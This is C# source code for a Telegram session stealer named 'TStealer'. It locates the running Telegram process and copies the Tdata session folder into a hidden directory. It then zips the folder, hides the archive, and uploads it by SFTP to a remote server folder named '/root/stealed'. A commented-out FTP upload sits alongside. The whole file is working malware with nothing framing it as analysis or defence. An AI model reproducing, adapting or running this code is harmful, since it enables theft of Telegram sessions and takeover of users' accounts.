using System;

using Renci.SshNet;
using System.IO;
using System.Diagnostics;
using System.IO.Compression;
using System.Net;
using System.Threading;
using System.Reflection;

namespace TStealer
{
    public static class Resolver
    {
        private static volatile bool _loaded;

        public static void RegisterDependencyResolver()
        {
            if (!_loaded)
            {
                AppDomain.CurrentDomain.AssemblyResolve += OnResolve;
                _loaded = true;
            }
        }

        private static Assembly OnResolve(object sender, ResolveEventArgs args)
        {
            Assembly execAssembly = Assembly.GetExecutingAssembly();
            string resourceName = String.Format("{0}.{1}.dll",
                execAssembly.GetName().Name,
                new AssemblyName(args.Name).Name);

            using (var stream = execAssembly.GetManifestResourceStream(resourceName))
            {
                int read = 0, toRead = (int)stream.Length;
                byte[] data = new byte[toRead];

                do
                {
                    int n = stream.Read(data, read, data.Length - read);
                    toRead -= n;
                    read += n;
                } while (toRead > 0);

                return Assembly.Load(data);
            }
        }
    }

    class Program
    {
        private class StealStart
        {
            private bool in_folder = false;


            public StealStart(string host = "", string login = "", string pass = "", bool del_zip = false)
            {
                new Thread(() => StealIt(host, login, pass, del_zip)).Start();
            }


            private void StealIt(string host, string login, string pass, bool del_zip)
            {
                var prcName = "Telegram";
                Process[] processByName = Process.GetProcessesByName(prcName);

                if (processByName.Length < 1)
                    return;

                var dir_from = Path.GetDirectoryName(processByName[0].MainModule.FileName) + "\\Tdata";
                var this_fileLocation = System.Reflection.Assembly.GetEntryAssembly().Location;
                var dir_to = Path.GetDirectoryName(this_fileLocation) +
                            "\\Tdata_" +
                            (int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds
                            ;
                var zipPath = dir_to + ".zip";


                CopyAll(dir_from, dir_to);
                ZipDir(dir_to, zipPath);
                Directory.Delete(dir_to, true);

                if (host == "")
                    return;
                
                LoadOnFtp(zipPath, host, login, pass);

                if(del_zip)
                    File.Delete(zipPath);
            }


            private void CopyAll(string fromDir, string toDir)
            {
                DirectoryInfo di = Directory.CreateDirectory(toDir);

                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                foreach (string s1 in Directory.GetFiles(fromDir))
                    CopyFile(s1, toDir);

                foreach (string s in Directory.GetDirectories(fromDir))
                    CopyDir(s, toDir);
            }


            private void CopyFile(string s1, string toDir)
            {
                try
                {
                    var fname = Path.GetFileName(s1);

                    if (in_folder && !(fname[0] == 'm' || fname[1] == 'a' || fname[2] == 'p'))
                        return;

                    var s2 = toDir + "\\" + fname;

                    File.Copy(s1, s2);
                }
                catch { }
            }


            private void CopyDir(string s, string toDir)
            {
                try
                {
                    in_folder = true;
                    CopyAll(s, toDir + "\\" + Path.GetFileName(s));
                    in_folder = false;
                }
                catch { }
            }


            private void ZipDir(string dir_to, string zipPath)
            {
                try
                {
                    ZipFile.CreateFromDirectory(dir_to, zipPath);
                    File.SetAttributes(zipPath, File.GetAttributes(zipPath) | FileAttributes.Hidden);
                }
                catch { }
            }


            private void LoadOnFtp(string zipPath, string host, string login, string pass)
            {
                /*try
                {
                    using (WebClient client = new WebClient())
                    {
                        client.Credentials = new NetworkCredential(login, pass);

                        client.UploadFile("ftp://" + host + "/" + Path.GetFileName(zipPath), "STOR", zipPath);
                    }
                }
                catch { }*/
                using (SftpClient client = new SftpClient(host, 22, login, pass))
                {
                    client.Connect();
                    client.ChangeDirectory("/root/stealed");
                    using (FileStream fs = new FileStream(zipPath, FileMode.Open))
                    {
                        client.BufferSize = 4 * 1024;
                        client.UploadFile(fs, Path.GetFileName(zipPath));
                    }
                }
            }
        }


        static void Main(string[] args)
        {
            Resolver.RegisterDependencyResolver();
            //var stealT = new StealStart();

            var host    = "";
            var login   = "root";
            var pass    = "";

            var steal_With_FTP = new StealStart(host, login, pass, false);
        }
    }
}
